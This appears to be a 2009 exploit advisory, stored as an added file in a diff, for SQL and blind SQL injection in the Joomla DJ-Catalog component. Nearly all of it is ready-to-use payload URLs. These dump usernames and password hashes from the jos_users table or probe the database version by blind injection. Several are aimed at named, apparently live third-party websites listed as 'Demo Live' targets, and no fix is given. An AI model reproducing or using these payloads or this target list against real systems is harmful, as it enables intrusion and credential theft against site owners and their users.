@@ -1,0 +1,88 @@
+-----------------------------------------------------------------------------------------
+joomla com_djcatalog component SQL/bsql Injection Multiple Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : Chip D3 Bi0s
+Email          : chipdebios[alt+64]gmail.com
+Date           : 15 September 2009
+Critical Lvl   : Moderate
+Impact	       : Exposure of sensitive information
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : DJ-Catalog directory
+version       : Beta
+Developer     : AndrzejH
+License       : GPL            type  : Non-Commercial
+Date Added    : 9 September 2009
+Demo          : http://addons.design-joomla.eu/djcat/
+                http://templates.design-joomla.eu/dj-mobile/
+Download      : http://www.design-joomla.eu/downloads/download/components/djcatalog-1.5.x/start-download.html
+Description   :
+
+Dj catalog is a universal component which meets these expectations,  may serve as a directory of products or specific galleries.
+Thanks to a flexible structure can be easily customized to your individual visual requirements.
+
+---------------------------------------------------------------------------
+
+
+I.SQL injection (id)/(cid)
+Poc/Exploit:
+~~~~~~~~~
+(id)
+http://127.0.0.1/[path]/index.php?option=com_djcatalog&view=showItem&id=[Sqlinjection]
+[Sqlinjection]: null+and+1=0+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12+from+jos_users
+
+(cid)
+index.php?option=com_djcatalog&view=show&cid=x[Sqlinjection]
+x             = valid cid
+Sqlinjection] = +and+1=2+union+select+1,password,3,4+from+jos_users
+
+Demo Live:
+~~~~~~~
+(id)
+http://server/dj-sailing/index.php?option=com_djcatalog&view=showItem&id=null+and+1=0+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12+from+jos_users
+http://server/index.php?option=com_djcatalog&view=showItem&id=null+and+1=0+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12+from+jos_users
+
+(cid)
+http://www.proforte.co.za/index.php?option=com_djcatalog&view=show&cid=5+and+1=0+union+select+1,password,3,4+from+jos_users
+
+
+
+II.BSQL injection (id)/(cid)
+Poc/Exploit:
+~~~~~~~~~
+(id)
+http://127.0.0.1/[path]/index.php?option=com_djcatalog&view=showItem&id=[BSQL]
+
+(cid)
+http://127.0.0.1/[path]/index.php?option=com_djcatalog&view=show&cid=x[BSQL]
+x = valid cid
+
+(blog&cid)
+http://127.0.0.1/[path]/index.php?option=com_djcatalog&view=show&layout=blog&cid=x[BSQL]
+x = valid cid
+
+Demo Live:
+~~~~~~~
+(id)
+http://acropolltda.com/index.php?option=com_djcatalog&view=showItem&id=1+and+(select+substring(concat(1,password),1,1)+from+jos_users+limit+0,1)=1
+http://www.serviproveer.com/index.php/diseno-web/diseno-grafico/components/modules/modules/mod_googlecurrencyconverter/templates/index.php?option=com_djcatalog&view=showItem&id=1+and+substring(@@version,1,1)=5
+
+
+(cid)
+http://templates.design-joomla.eu/dj-mobile/index.php?option=com_djcatalog&view=show&cid=1+and+substring(@@version,1,1)=5
+http://acropolltda.com/index.php?option=com_djcatalog&view=show&cid=10+and+substring(@@version,1,1)=5
+
+(blog&cid)
+http://fifthelementorgone.com/index.php?option=com_djcatalog&view=show&layout=blog&cid=1+and+substring(@@version,1,1)=5
+http://www.gamerszone.org/index.php?option=com_djcatalog&view=show&layout=blog&cid=10+and+substring(@@version,1,1)=5
+
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
+# milw0rm.com [2009-09-15]
